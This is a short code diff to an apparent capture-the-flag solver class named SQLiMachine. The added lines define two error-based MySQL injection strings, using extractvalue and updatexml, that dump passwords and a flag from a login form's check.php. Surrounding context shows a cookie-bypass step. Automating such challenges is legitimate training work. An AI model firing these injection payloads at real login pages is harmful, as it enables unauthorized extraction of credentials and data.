@@ -1585,6 +1585,21 @@ class SQLiMachine(RouteStateMachine):
                 "extract_flag": True,
             })
 
+        # --- Error-based injection on login forms (HardSQL style) ---
+        error_payloads = [
+            "admin'or(extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e)))#",
+            "admin'or(updatexml(1,concat(0x7e,(select(group_concat(flag))from(flag)),0x7e),1))#",
+        ]
+        for ep in error_payloads:
+            steps.append({
+                "name": f"error_login_{hash(ep) & 0xffff:x}",
+                "description": f"报错注入 /check.php: {ep[:40]}",
+                "method": "GET",
+                "path": "/check.php",
+                "params": {"username": "admin", "password": ep},
+                "extract_flag": True,
+            })
+
         # --- Cookie/auth bypass (BuyFlag style) ---
         steps.append({
             "name": "buyflag_cookie_bypass",
